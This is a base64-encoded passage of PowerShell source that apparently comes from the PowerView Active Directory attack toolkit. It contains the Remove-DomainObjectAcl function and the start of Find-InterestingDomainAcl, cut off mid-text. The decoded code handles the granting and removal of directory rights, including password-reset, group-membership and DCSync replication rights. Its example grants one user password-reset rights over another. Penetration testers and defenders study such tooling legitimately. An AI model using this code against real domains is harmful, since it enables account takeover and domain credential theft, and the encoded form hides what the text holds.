ICckUmlnaHRzJyBvbiAkKCRUYXJnZXRPYmplY3QuUHJvcGVydGllcy5kaXN0aW5ndWlzaGVkbmFtZSkgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIFJlbW92ZS1Eb21haW5PYmplY3RBY2wgewo8IwouU1lOT1BTSVMKClJlbW92ZXMgYW4gQUNMIGZyb20gYSBzcGVjaWZpYyBhY3RpdmUgZGlyZWN0b3J5IG9iamVjdC4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbk9iamVjdCAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gbW9kaWZpZXMgdGhlIEFDTC9BQ0UgZW50cmllcyBmb3IgYSBnaXZlbiBBY3RpdmUgRGlyZWN0b3J5CnRhcmdldCBvYmplY3Qgc3BlY2lmaWVkIGJ5IC1UYXJnZXRJZGVudGl0eS4gQXZhaWxhYmxlIC1SaWdodHMgYXJlCidBbGwnLCAnUmVzZXRQYXNzd29yZCcsICdXcml0ZU1lbWJlcnMnLCAnRENTeW5jJywgb3IgYSBtYW51YWwgZXh0ZW5kZWQKcmlnaHRzIEdVSUQgY2FuIGJlIHNldCB3aXRoIC1SaWdodHNHVUlELiBUaGVzZSByaWdodHMgYXJlIHJlbW92ZWQgZnJvbSB0aGUgdGFyZ2V0Cm9iamVjdCBmb3IgdGhlIHNwZWNpZmllZCAtUHJpbmNpcGFsSWRlbnRpdHkuCgouUEFSQU1FVEVSIFRhcmdldElkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIGhhcm1qMHkpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDEpCmZvciB0aGUgZG9tYWluIG9iamVjdCB0byBtb2RpZnkgQUNMcyBmb3IuIFJlcXVpcmVkLiBXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIFRhcmdldERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gZm9yIHRoZSBUYXJnZXRJZGVudGl0eSB0byB1c2UgZm9yIHRoZSBtb2RpZmljYXRpb24sIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgVGFyZ2V0TERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3QgdGFyZ2V0cy4KCi5QQVJBTUVURVIgVGFyZ2V0U2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoIGZvciB0YXJnZXRzLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgUHJpbmNpcGFsSWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gaGFybWoweSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkKZm9yIHRoZSBkb21haW4gcHJpbmNpcGFsIHRvIGFkZCBmb3IgdGhlIEFDTC4gUmVxdWlyZWQuIFdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgUHJpbmNpcGFsRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiBmb3IgdGhlIFRhcmdldElkZW50aXR5IHRvIHVzZSBmb3IgdGhlIHByaW5jaXBhbCwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5QQVJBTUVURVIgUmlnaHRzCgpSaWdodHMgdG8gYWRkIGZvciB0aGUgcHJpbmNpcGFsLCAnQWxsJywgJ1Jlc2V0UGFzc3dvcmQnLCAnV3JpdGVNZW1iZXJzJywgJ0RDU3luYycuCkRlZmF1bHRzIHRvICdBbGwnLgoKLlBBUkFNRVRFUiBSaWdodHNHVUlECgpNYW51YWwgR1VJRCByZXByZXNlbnRpbmcgdGhlIHJpZ2h0IHRvIGFkZCB0byB0aGUgdGFyZ2V0LgoKLkVYQU1QTEUKCiRVc2VyU0lEID0gR2V0LURvbWFpblVzZXIgdXNlciB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IG9iamVjdHNpZApHZXQtRG9tYWluT2JqZWN0QUNMIHVzZXIyIC1SZXNvbHZlR1VJRHMgfCBXaGVyZS1PYmplY3QgeyRfLnNlY3VyaXR5aWRlbnRpZmllciAtZXEgJFVzZXJTSUR9Cgpbbm8gcmVzdWx0cyByZXR1cm5lZF0KCkFkZC1Eb21haW5PYmplY3RBY2wgLVRhcmdldElkZW50aXR5IHVzZXIyIC1QcmluY2lwYWxJZGVudGl0eSB1c2VyIC1SaWdodHMgUmVzZXRQYXNzd29yZAoKR2V0LURvbWFpbk9iamVjdEFDTCB1c2VyMiAtUmVzb2x2ZUdVSURzIHwgV2hlcmUtT2JqZWN0IHskXy5zZWN1cml0eWlkZW50aWZpZXIgLWVxICRVc2VyU0lEIH0KCkFjZVF1YWxpZmllciAgICAgICAgICAgOiBBY2Nlc3NBbGxvd2VkCk9iamVjdEROICAgICAgICAgICAgICAgOiBDTj11c2VyMixDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsCkFjdGl2ZURpcmVjdG9yeVJpZ2h0cyAgOiBFeHRlbmRlZFJpZ2h0Ck9iamVjdEFjZVR5cGUgICAgICAgICAgOiBVc2VyLUZvcmNlLUNoYW5nZS1QYXNzd29yZApPYmplY3RTSUQgICAgICAgICAgICAgIDogUy0xLTUtMjEtODgzMjMyODIyLTI3NDEzNzY4NS00MTczMjA3OTk3LTIxMDUKSW5oZXJpdGFuY2VGbGFncyAgICAgICA6IE5vbmUKQmluYXJ5TGVuZ3RoICAgICAgICAgICA6IDU2CkFjZVR5cGUgICAgICAgICAgICAgICAgOiBBY2Nlc3NBbGxvd2VkT2JqZWN0Ck9iamVjdEFjZUZsYWdzICAgICAgICAgOiBPYmplY3RBY2VUeXBlUHJlc2VudApJc0NhbGxiYWNrICAgICAgICAgICAgIDogRmFsc2UKUHJvcGFnYXRpb25GbGFncyAgICAgICA6IE5vbmUKU2VjdXJpdHlJZGVudGlmaWVyICAgICA6IFMtMS01LTIxLTg4MzIzMjgyMi0yNzQxMzc2ODUtNDE3MzIwNzk5Ny0yMTA0CkFjY2Vzc01hc2sgICAgICAgICAgICAgOiAyNTYKQXVkaXRGbGFncyAgICAgICAgICAgICA6IE5vbmUKSXNJbmhlcml0ZWQgICAgICAgICAgICA6IEZhbHNlCkFjZUZsYWdzICAgICAgICAgICAgICAgOiBOb25lCkluaGVyaXRlZE9iamVjdEFjZVR5cGUgOiBBbGwKT3BhcXVlTGVuZ3RoICAgICAgICAgICA6IDAKCgpSZW1vdmUtRG9tYWluT2JqZWN0QWNsIC1UYXJnZXRJZGVudGl0eSB1c2VyMiAtUHJpbmNpcGFsSWRlbnRpdHkgdXNlciAtUmlnaHRzIFJlc2V0UGFzc3dvcmQKCkdldC1Eb21haW5PYmplY3RBQ0wgdXNlcjIgLVJlc29sdmVHVUlEcyB8IFdoZXJlLU9iamVjdCB7JF8uc2VjdXJpdHlpZGVudGlmaWVyIC1lcSAkVXNlclNJRH0KCltubyByZXN1bHRzIHJldHVybmVkXQoKLkxJTksKCmh0dHBzOi8vc29jaWFsLnRlY2huZXQubWljcm9zb2Z0LmNvbS9Gb3J1bXMvd2luZG93c3NlcnZlci9lbi1VUy9kZjNiZmQzMy1jMDcwLTRhOWMtYmU5OC1jNGRhNmU1OTFhMGEvZm9ydW0tZmFxLXVzaW5nLXBvd2Vyc2hlbGwtdG8tYXNzaWduLXBlcm1pc3Npb25zLW9uLWFjdGl2ZS1kaXJlY3Rvcnktb2JqZWN0cz9mb3J1bT13aW5zZXJ2ZXJwb3dlcnNoZWxsCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRUYXJnZXRJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRUYXJnZXREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRUYXJnZXRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFRhcmdldFNlYXJjaEJhc2UsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcmluY2lwYWxJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQcmluY2lwYWxEb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0FsbCcsICdSZXNldFBhc3N3b3JkJywgJ1dyaXRlTWVtYmVycycsICdEQ1N5bmMnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRSaWdodHMgPSAnQWxsJywKCiAgICAgICAgW0d1aWRdCiAgICAgICAgJFJpZ2h0c0dVSUQKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ2Rpc3Rpbmd1aXNoZWRuYW1lJwogICAgICAgICAgICAnUmF3JyA9ICRUcnVlCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RhcmdldERvbWFpbiddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkVGFyZ2V0RG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUYXJnZXRMREFQRmlsdGVyJ10pIHsgJFRhcmdldFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkVGFyZ2V0TERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVGFyZ2V0U2VhcmNoQmFzZSddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFRhcmdldFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRUYXJnZXRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnSWRlbnRpdHknID0gJFByaW5jaXBhbElkZW50aXR5CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkaXN0aW5ndWlzaGVkbmFtZSxvYmplY3RzaWQnCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1ByaW5jaXBhbERvbWFpbiddKSB7ICRQcmluY2lwYWxTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkUHJpbmNpcGFsRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkUHJpbmNpcGFsU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkUHJpbmNpcGFscyA9IEdldC1Eb21haW5PYmplY3QgQFByaW5jaXBhbFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgaWYgKC1ub3QgJFByaW5jaXBhbHMpIHsKICAgICAgICAgICAgdGhyb3cgIlVuYWJsZSB0byByZXNvbHZlIHByaW5jaXBhbDogJFByaW5jaXBhbElkZW50aXR5IgogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAkVGFyZ2V0U2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkVGFyZ2V0SWRlbnRpdHkKICAgICAgICAkVGFyZ2V0cyA9IEdldC1Eb21haW5PYmplY3QgQFRhcmdldFNlYXJjaGVyQXJndW1lbnRzCgogICAgICAgIEZvckVhY2ggKCRUYXJnZXRPYmplY3QgaW4gJFRhcmdldHMpIHsKCiAgICAgICAgICAgICRJbmhlcml0YW5jZVR5cGUgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeVNlY3VyaXR5SW5oZXJpdGFuY2VdICdOb25lJwogICAgICAgICAgICAkQ29udHJvbFR5cGUgPSBbU3lzdGVtLlNlY3VyaXR5LkFjY2Vzc0NvbnRyb2wuQWNjZXNzQ29udHJvbFR5cGVdICdBbGxvdycKICAgICAgICAgICAgJEFDRXMgPSBAKCkKCiAgICAgICAgICAgIGlmICgkUmlnaHRzR1VJRCkgewogICAgICAgICAgICAgICAgJEdVSURzID0gQCgkUmlnaHRzR1VJRCkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRHVUlEcyA9IFN3aXRjaCAoJFJpZ2h0cykgewogICAgICAgICAgICAgICAgICAgICMgUmVzZXRQYXNzd29yZCBkb2Vzbid0IG5lZWQgdG8ga25vdyB0aGUgdXNlcidzIGN1cnJlbnQgcGFzc3dvcmQKICAgICAgICAgICAgICAgICAgICAnUmVzZXRQYXNzd29yZCcgeyAnMDAyOTk1NzAtMjQ2ZC0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5JyB9CiAgICAgICAgICAgICAgICAgICAgIyBhbGxvd3MgZm9yIHRoZSBtb2RpZmljYXRpb24gb2YgZ3JvdXAgbWVtYmVyc2hpcAogICAgICAgICAgICAgICAgICAgICdXcml0ZU1lbWJlcnMnIHsgJ2JmOTY3OWMwLTBkZTYtMTFkMC1hMjg1LTAwYWEwMDMwNDllMicgfQogICAgICAgICAgICAgICAgICAgICMgJ0RTLVJlcGxpY2F0aW9uLUdldC1DaGFuZ2VzJyA9IDExMzFmNmFhLTljMDctMTFkMS1mNzlmLTAwYzA0ZmMyZGNkMgogICAgICAgICAgICAgICAgICAgICMgJ0RTLVJlcGxpY2F0aW9uLUdldC1DaGFuZ2VzLUFsbCcgPSAxMTMxZjZhZC05YzA3LTExZDEtZjc5Zi0wMGMwNGZjMmRjZDIKICAgICAgICAgICAgICAgICAgICAjICdEUy1SZXBsaWNhdGlvbi1HZXQtQ2hhbmdlcy1Jbi1GaWx0ZXJlZC1TZXQnID0gODllOTViNzYtNDQ0ZC00YzYyLTk5MWEtMGZhY2JlZGE2NDBjCiAgICAgICAgICAgICAgICAgICAgIyAgIHdoZW4gYXBwbGllZCB0byBhIGRvbWFpbidzIEFDTCwgYWxsb3dzIGZvciB0aGUgdXNlIG9mIERDU3luYwogICAgICAgICAgICAgICAgICAgICdEQ1N5bmMnIHsgJzExMzFmNmFhLTljMDctMTFkMS1mNzlmLTAwYzA0ZmMyZGNkMicsICcxMTMxZjZhZC05YzA3LTExZDEtZjc5Zi0wMGMwNGZjMmRjZDInLCAnODllOTViNzYtNDQ0ZC00YzYyLTk5MWEtMGZhY2JlZGE2NDBjJ30KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgRm9yRWFjaCAoJFByaW5jaXBhbE9iamVjdCBpbiAkUHJpbmNpcGFscykgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1JlbW92ZS1Eb21haW5PYmplY3RBY2xdIFJlbW92aW5nIHByaW5jaXBhbCAkKCRQcmluY2lwYWxPYmplY3QuZGlzdGluZ3Vpc2hlZG5hbWUpICckUmlnaHRzJyBmcm9tICQoJFRhcmdldE9iamVjdC5Qcm9wZXJ0aWVzLmRpc3Rpbmd1aXNoZWRuYW1lKSIKCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eSA9IFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLklkZW50aXR5UmVmZXJlbmNlXSAoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyXSRQcmluY2lwYWxPYmplY3Qub2JqZWN0c2lkKQoKICAgICAgICAgICAgICAgICAgICBpZiAoJEdVSURzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRHVUlEIGluICRHVUlEcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ld0dVSUQgPSBOZXctT2JqZWN0IEd1aWQgJEdVSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBRFJpZ2h0cyA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5UmlnaHRzXSAnRXh0ZW5kZWRSaWdodCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBQ0VzICs9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeUFjY2Vzc1J1bGUgJElkZW50aXR5LCAkQURSaWdodHMsICRDb250cm9sVHlwZSwgJE5ld0dVSUQsICRJbmhlcml0YW5jZVR5cGUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBkZWF1bHQgdG8gR2VuZXJpY0FsbCByaWdodHMKICAgICAgICAgICAgICAgICAgICAgICAgJEFEUmlnaHRzID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlSaWdodHNdICdHZW5lcmljQWxsJwogICAgICAgICAgICAgICAgICAgICAgICAkQUNFcyArPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnlBY2Nlc3NSdWxlICRJZGVudGl0eSwgJEFEUmlnaHRzLCAkQ29udHJvbFR5cGUsICRJbmhlcml0YW5jZVR5cGUKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICMgcmVtb3ZlIGFsbCB0aGUgc3BlY2lmaWVkIEFDRXMgZnJvbSB0aGUgc3BlY2lmaWVkIG9iamVjdCBkaXJlY3RvcnkgZW50cnkKICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkQUNFIGluICRBQ0VzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltSZW1vdmUtRG9tYWluT2JqZWN0QWNsXSBHcmFudGluZyBwcmluY2lwYWwgJCgkUHJpbmNpcGFsT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lKSByaWdodHMgR1VJRCAnJCgkQUNFLk9iamVjdFR5cGUpJyBvbiAkKCRUYXJnZXRPYmplY3QuUHJvcGVydGllcy5kaXN0aW5ndWlzaGVkbmFtZSkiCiAgICAgICAgICAgICAgICAgICAgICAgICRUYXJnZXRFbnRyeSA9ICRUYXJnZXRPYmplY3QuR2V0RGlyZWN0b3J5RW50cnkoKQogICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0RW50cnkuUHNCYXNlLk9wdGlvbnMuU2VjdXJpdHlNYXNrcyA9ICdEYWNsJwogICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0RW50cnkuUHNCYXNlLk9iamVjdFNlY3VyaXR5LlJlbW92ZUFjY2Vzc1J1bGUoJEFDRSkKICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldEVudHJ5LlBzQmFzZS5Db21taXRDaGFuZ2VzKCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1JlbW92ZS1Eb21haW5PYmplY3RBY2xdIEVycm9yIHJlbW92aW5nIHByaW5jaXBhbCAkKCRQcmluY2lwYWxPYmplY3QuZGlzdGluZ3Vpc2hlZG5hbWUpICckUmlnaHRzJyBmcm9tICQoJFRhcmdldE9iamVjdC5Qcm9wZXJ0aWVzLmRpc3Rpbmd1aXNoZWRuYW1lKSA6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gRmluZC1JbnRlcmVzdGluZ0RvbWFpbkFjbCB7CjwjCi5TWU5PUFNJUwoKRmluZHMgb2JqZWN0IEFDTHMgaW4gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluIHdpdGggbW9kaWZpY2F0aW9uCnJpZ2h0cyBzZXQgdG8gbm9uLWJ1aWx0IGluIG9iamVjdHMuCgpUaGFua3MgU2VhbiBNZXRjYWxmIChAcHlyb3RlazMpIGZvciB0aGUgaWRlYSBhbmQgZ3VpZGFuY2UuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5PYmplY3RBY2wsIEdldC1Eb21haW5PYmplY3QsIENvbnZlcnQtQUROYW1lICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiBlbnVtZXJhdGVzIHRoZSBBQ0xzIGZvciBldmVyeSBvYmplY3QgaW4gdGhlIGRvbWFpbiB3aXRoIEdldC1Eb21haW5PYmplY3RBY2wsCmFuZCBmb3IgZWFjaCByZXR1cm5lZCBBQ0UgZW50cnkgaXQgY2hlY2tzIGlmIHByaW5jaXBhbCBzZWN1cml0eSBpZGVudGlmaWVyCmlzICotMTAwMCAobWVhbmluZyB0aGUgYWNjb3VudCBpcyBub3QgYnVpbHQgaW4pLCBhbmQgYWxzbyBjaGVja3MgaWY